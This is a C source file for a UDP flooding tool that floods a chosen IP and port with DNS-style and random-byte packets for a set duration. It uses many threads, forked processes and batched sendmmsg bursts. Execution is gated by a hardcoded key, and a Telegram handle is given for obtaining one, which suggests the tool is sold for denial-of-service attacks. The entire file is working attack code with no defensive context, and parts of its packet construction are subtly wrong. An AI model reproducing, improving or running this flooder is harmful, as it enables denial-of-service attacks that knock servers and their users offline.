#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <time.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <sys/types.h>
#include <sys/wait.h>

#define MAX_PACKET_SIZE 1472
#define MAX_THREADS 128
#define MAX_BURST 256    // Giảm từ 512 xuống 256
#define MAX_PAYLOADS 100
#define MAX_PROCESSES 4

typedef struct {
    char ip_target[64];
    int port;
    int duration;
    int packet_size;
    int threads;
    int burst_size;
} config_t;

typedef struct {
    config_t *cfg;
    int thread_id;
} thread_arg_t;

char payloads[MAX_PAYLOADS][MAX_PACKET_SIZE];
int payload_lens[MAX_PAYLOADS];
int total_payloads = 0;

void add_payload(const unsigned char *data, int len) {
    if (total_payloads >= MAX_PAYLOADS || len > MAX_PACKET_SIZE) return;
    memcpy(payloads[total_payloads], data, len);
    payload_lens[total_payloads] = len;
    total_payloads++;
}

unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len) sum += *(unsigned char*)buf;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (unsigned short)~sum;
}

void generate_payloads() {
    srand(time(NULL));

    const unsigned char dns_flood[] = "\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01";
    add_payload(dns_flood, sizeof(dns_flood)-1);

    const unsigned char dns_any[] = "\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06govdot\x03com\x00\x00\xFF\x00\x01";
    add_payload(dns_any, sizeof(dns_any)-1);

    for (int i = 0; i < MAX_PAYLOADS - 2; i++) {
        int len = 200 + rand() % (MAX_PACKET_SIZE - 200 - sizeof(struct udphdr));
        unsigned char buffer[MAX_PACKET_SIZE - sizeof(struct udphdr)];
        memcpy(buffer, dns_flood, sizeof(dns_flood)-1);
        for (int j = sizeof(dns_flood)-1; j < len; j++) {
            buffer[j] = rand() % 256;
        }
        add_payload(buffer, len);
    }
}

void bind_core(int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
}

void* flood_thread(void *arg) {
    thread_arg_t *thread = (thread_arg_t *)arg;
    config_t *cfg = thread->cfg;

    bind_core(thread->thread_id);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;

    int reuse = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(reuse));

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(cfg->port);
    inet_pton(AF_INET, cfg->ip_target, &target.sin_addr);

    char sendbuf[MAX_BURST][MAX_PACKET_SIZE];
    struct iovec iov[MAX_BURST];
    struct mmsghdr msgs[MAX_BURST];
    struct udphdr *udp_header;

    time_t end_time = time(NULL) + cfg->duration;

    while (time(NULL) < end_time) {
        for (int i = 0; i < cfg->burst_size; i++) {
            int idx = rand() % total_payloads;
            int len = payload_lens[idx];
            if (len > cfg->packet_size) len = cfg->packet_size;

            memcpy(sendbuf[i], payloads[idx], len);
            udp_header = (struct udphdr *)sendbuf[i];
            udp_header->source = htons(53);
            udp_header->dest = htons(cfg->port);
            udp_header->len = htons(len + sizeof(struct udphdr));
            udp_header->check = checksum((unsigned short *)sendbuf[i], len + sizeof(struct udphdr));

            iov[i].iov_base = sendbuf[i];
            iov[i].iov_len = len + sizeof(struct udphdr);

            msgs[i].msg_hdr.msg_name = &target;
            msgs[i].msg_hdr.msg_namelen = sizeof(target);
            msgs[i].msg_hdr.msg_iov = &iov[i];
            msgs[i].msg_hdr.msg_iovlen = 1;
            msgs[i].msg_hdr.msg_control = NULL;
            msgs[i].msg_hdr.msg_controllen = 0;
            msgs[i].msg_hdr.msg_flags = 0;
        }

        int sent = sendmmsg(sock, msgs, cfg->burst_size, 0);
        if (sent < 0) {
            usleep(1000);
            continue;
        }
        usleep(rand() % 500);
    }

    close(sock);
    return NULL;
}

void run_flood(config_t *cfg) {
    pthread_t tid[MAX_THREADS];
    thread_arg_t args[MAX_THREADS];

    for (int i = 0; i < cfg->threads; i++) {
        args[i].cfg = cfg;
        args[i].thread_id = i;
        pthread_create(&tid[i], NULL, flood_thread, &args[i]);
    }

    for (int i = 0; i < cfg->threads; i++) {
        pthread_join(tid[i], NULL);
    }
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("Usage: %s <ip> <port> <duration> <key> [packet_size=1472] [burst=256]\n", argv[0]);
        return 1;
    }

    // Validate key
    const char *expected_key = "69621dd1f774f908037fbf2a065dc6f1";
    if (strcmp(argv[4], expected_key) != 0) {
        printf("Wrong key please contact telegram : @chuongsex\n");
        return 1;
    }

    config_t cfg;
    memset(&cfg, 0, sizeof(cfg));
    strncpy(cfg.ip_target, argv[1], sizeof(cfg.ip_target)-1);
    cfg.port = atoi(argv[2]);
    cfg.duration = atoi(argv[3]);
    cfg.packet_size = (argc >= 6) ? atoi(argv[5]) : MAX_PACKET_SIZE;
    cfg.burst_size = (argc >= 7) ? atoi(argv[6]) : MAX_BURST; // Mặc định là 256
    cfg.threads = sysconf(_SC_NPROCESSORS_ONLN);
    if (cfg.threads > MAX_THREADS) cfg.threads = MAX_THREADS;

    printf("Preparing payloads...\n");
    generate_payloads();

    for (int i = 0; i < MAX_PROCESSES; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            run_flood(&cfg);
            exit(0);
        } else if (pid < 0) {
            perror("fork failed");
            break;
        }
    }

    for (int i = 0; i < MAX_PROCESSES; i++) wait(NULL);

    printf("Flood complete.\n");
    return 0;
}